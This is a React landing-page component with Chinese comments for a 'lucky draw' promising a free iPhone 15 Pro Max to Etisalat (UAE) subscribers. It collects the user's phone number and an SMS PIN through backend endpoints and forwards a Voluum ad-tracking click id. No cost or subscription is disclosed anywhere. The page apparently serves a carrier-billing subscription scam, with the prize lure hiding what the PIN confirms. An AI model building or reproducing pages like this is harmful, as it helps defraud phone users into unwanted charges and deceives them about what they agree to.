import { useState, useEffect } from 'react';

export default function Home() {
  const [clickId, setClickId] = useState('');
  const [msisdn, setMsisdn] = useState('');
  const [pin, setPin] = useState('');
  const [step, setStep] = useState(1); 
  const [txid, setTxid] = useState('');
  const [message, setMessage] = useState('');

  // 获取 Voluum 的 click_id
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('cid')) setClickId(params.get('cid'));
  }, []);

  // 呼叫后台获取 PIN
  const handleRequestPin = async () => {
    if (!msisdn.startsWith('971')) return setMessage('请输入正确的阿联酋号码 (971开头)');
    setMessage('请求中...');
    const res = await fetch('/api/request', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ msisdn, click_id: clickId })
    }).then(r => r.json());

 if (res.success) {
      setTxid(res.txid);
      setStep(2);
      setMessage('PIN 码已发送至您的手机！');
    } else {
      setMessage(`❌ 失败原因: ${res.error}`); // 直接显示后台传来的真实死因
    }
  };

  // 呼叫后台验证 PIN
  const handleVerifyPin = async () => {
    setMessage('验证中...');
    const res = await fetch('/api/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ txid, pin, click_id: clickId })
    }).then(r => r.json());

    if (res.success) {
      setStep(3);
    } else {
      setMessage('PIN 码错误，请重新输入');
    }
  };

  // 下面这些就是你熟悉的 HTML 结构！
  return (
    <div style={{ fontFamily: 'Arial, sans-serif', textAlign: 'center', padding: '20px', backgroundColor: '#f0f2f5', minHeight: '100vh' }}>
      <div style={{ maxWidth: '400px', margin: '40px auto', background: '#fff', padding: '30px', borderRadius: '12px', boxShadow: '0 4px 12px rgba(0,0,0,0.1)' }}>
        
        <h1 style={{ color: '#d32f2f', margin: '0 0 10px 0' }}>🎁 幸运抽奖 🎁</h1>
        <p style={{ fontSize: '18px', fontWeight: 'bold' }}>赢取全新 iPhone 15 Pro Max！</p>
        <p style={{ color: '#666', fontSize: '12px', marginBottom: '20px' }}>*仅限 Etisalat 用户参与</p>

        {step === 1 && (
          <div>
            <p style={{ marginBottom: '10px' }}>请输入您的手机号码参与抽奖：</p>
            <input 
              type="tel" 
              placeholder="例如: 971501234567" 
              value={msisdn}
              onChange={(e) => setMsisdn(e.target.value)}
              style={{ width: '90%', padding: '12px', marginBottom: '20px', border: '1px solid #ccc', borderRadius: '6px', fontSize: '16px' }}
            />
            <button 
              onClick={handleRequestPin} 
              style={{ width: '90%', padding: '14px', backgroundColor: '#4caf50', color: '#fff', border: 'none', borderRadius: '6px', fontSize: '18px', cursor: 'pointer', fontWeight: 'bold' }}
            >
              确认并获取验证码
            </button>
          </div>
        )}

        {step === 2 && (
          <div>
            <p style={{ color: '#4caf50', marginBottom: '10px' }}>✅ 验证码已发送，请查看短信</p>
            <input 
              type="text" 
              placeholder="输入收到的 PIN 码" 
              value={pin}
              onChange={(e) => setPin(e.target.value)}
              style={{ width: '90%', padding: '12px', marginBottom: '20px', border: '1px solid #ccc', borderRadius: '6px', fontSize: '16px', textAlign: 'center', letterSpacing: '2px' }}
            />
            <button 
              onClick={handleVerifyPin} 
              style={{ width: '90%', padding: '14px', backgroundColor: '#1976d2', color: '#fff', border: 'none', borderRadius: '6px', fontSize: '18px', cursor: 'pointer', fontWeight: 'bold' }}
            >
              验证并参与抽奖
            </button>
          </div>
        )}

        {step === 3 && (
          <div>
            <h2 style={{ color: '#4caf50' }}>🎉 恭喜您！🎉</h2>
            <p>您已成功参与抽奖，请留意后续通知。</p>
          </div>
        )}

        <p style={{ color: '#d32f2f', marginTop: '15px', minHeight: '20px' }}>{message}</p>
      </div>
    </div>
  );
}